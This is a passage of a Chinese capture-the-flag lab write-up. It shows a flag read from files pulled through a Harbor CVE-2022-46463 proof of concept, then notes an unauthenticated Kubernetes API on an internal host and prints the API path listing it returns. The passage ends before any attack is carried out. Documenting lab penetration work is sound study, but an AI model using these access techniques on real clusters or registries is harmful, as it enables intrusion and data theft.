<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/pocs/CVE-2022-46463/caches/harbor_secret/latest</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag05: flag</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">8c89ccd3-029d-41c8-8b47-98fb2006f0cf</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---05">flag - 05<a href="#flag---05" class="hash-link" aria-label="flag - 05的直接链接" title="flag - 05的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172221437-kubernetes">172.22.14.37 Kubernetes<a href="#172221437-kubernetes" class="hash-link" aria-label="172.22.14.37 Kubernetes的直接链接" title="172.22.14.37 Kubernetes的直接链接">​</a></h2>
<p>存在有 Kubernetes API 未授权，尝试进行攻击</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">https://172.22.14.37:6443</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;paths&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/api&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/api/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/admissionregistration.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/admissionregistration.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/admissionregistration.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apiextensions.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apiextensions.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apiextensions.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apiregistration.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apiregistration.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apiregistration.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apps&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/apps/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/authentication.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/authentication.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/authentication.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/authorization.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/authorization.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/authorization.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/autoscaling&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/autoscaling/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/autoscaling/v2beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/autoscaling/v2beta2&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/batch&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/batch/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/batch/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/certificates.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/certificates.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/coordination.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/coordination.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/coordination.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/events.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/events.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/extensions&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/extensions/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/networking.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/networking.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/networking.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/node.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/node.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/policy&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/policy/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/rbac.authorization.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/rbac.authorization.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/rbac.authorization.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/scheduling.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/scheduling.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/scheduling.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/storage.k8s.io&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/storage.k8s.io/v1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/apis/storage.k8s.io/v1beta1&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/autoregister-completion&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/etcd&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/log&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/ping&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/apiservice-openapi-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/apiservice-registration-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/apiservice-status-available-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/bootstrap-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/ca-registration&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/crd-informer-synced&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/generic-apiserver-start-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/kube-apiserver-autoregistration&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/rbac/bootstrap-roles&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/scheduling/bootstrap-system-priority-classes&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/start-apiextensions-controllers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/start-apiextensions-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/start-kube-aggregator-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/healthz/poststarthook/start-kube-apiserver-admission-initializer&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/autoregister-completion&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/etcd&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/log&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/ping&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/apiservice-openapi-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/apiservice-registration-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/apiservice-status-available-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/bootstrap-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/ca-registration&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/crd-informer-synced&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/generic-apiserver-start-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/kube-apiserver-autoregistration&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/rbac/bootstrap-roles&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/scheduling/bootstrap-system-priority-classes&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/start-apiextensions-controllers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/start-apiextensions-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/start-kube-aggregator-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/livez/poststarthook/start-kube-apiserver-admission-initializer&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/logs&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/metrics&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/openapi/v2&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/autoregister-completion&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/etcd&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/log&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/ping&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/apiservice-openapi-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/apiservice-registration-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/apiservice-status-available-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/bootstrap-controller&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/ca-registration&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/crd-informer-synced&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/generic-apiserver-start-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/kube-apiserver-autoregistration&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/rbac/bootstrap-roles&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/scheduling/bootstrap-system-priority-classes&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/start-apiextensions-controllers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/start-apiextensions-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/start-kube-aggregator-informers&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/poststarthook/start-kube-apiserver-admission-initializer&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/readyz/shutdown&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&quot;/version&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
